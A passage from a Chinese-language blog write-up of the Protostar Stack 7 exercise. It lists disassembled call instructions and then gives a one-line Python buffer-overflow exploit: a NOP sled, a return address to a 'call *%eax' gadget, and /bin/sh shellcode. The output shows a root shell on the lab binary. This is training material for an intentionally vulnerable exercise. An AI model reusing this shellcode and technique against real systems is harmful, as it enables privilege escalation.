804842c:       e8 83 ff ff ff          call   80483b4 &lt;__libc_start_main@plt&gt;
8048478:       ff 14 85 5c 96 04 08    call   *0x804965c(,%eax,4)
80484bf:       ff d0                   call   *%eax
80484d2:       e8 0d ff ff ff          call   80483e4 &lt;printf@plt&gt;
80484df:       e8 f0 fe ff ff          call   80483d4 &lt;fflush@plt&gt;
80484ea:       e8 b5 fe ff ff          call   80483a4 &lt;gets@plt&gt;
8048513:       e8 cc fe ff ff          call   80483e4 &lt;printf@plt&gt;
804851f:       e8 a0 fe ff ff          call   80483c4 &lt;_exit@plt&gt;
8048533:       e8 ac fe ff ff          call   80483e4 &lt;printf@plt&gt;
804853e:       e8 b1 fe ff ff          call   80483f4 &lt;strdup@plt&gt;
804854b:       e8 74 ff ff ff          call   80484c4 &lt;getpath&gt;
8048576:       e8 4f 00 00 00          call   80485ca &lt;__i686.get_pc_thunk.bx&gt;
8048584:       e8 cb fd ff ff          call   8048354 &lt;_init&gt;
80485b4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)
80485eb:       ff d0                   call   *%eax
8048603:       e8 00 00 00 00          call   8048608 &lt;_fini+0xc&gt;
804860f:       e8 2c fe ff ff          call   8048440 &lt;__do_global_dtors_aux&gt;
2a0:   9a 06 00 00 80 00 90    lcall  $0x9000,$0x80000006
</code></pre><p>使用的是0x080484bf，构造的exploit如下：</p>
<pre><code>$ python -c &apos;print &quot;\x90&quot;*62 + &quot;\xeb\x14&quot; + &quot;\x90&quot;*16 + &quot;\xbf\x84\x04\x08&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒1۰̀Sh/ttyh/dev▒▒1▒f▒&apos;▒̀1▒Ph//shh/bin▒▒PS▒ᙰ
                                                                  ̀
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/jack0pan">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&text=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&is_video=false&description=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploit Exercises Protostar Stack Write-ups&body=Check out this article: http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&name=Exploit Exercises Protostar Stack Write-ups&description=&lt;p&gt;#Stack&lt;/p&gt;
&lt;p&gt;##Stack 0&lt;br&gt;About&lt;br&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack0&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Jack Pan
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/jack0pan">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jack0pan';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


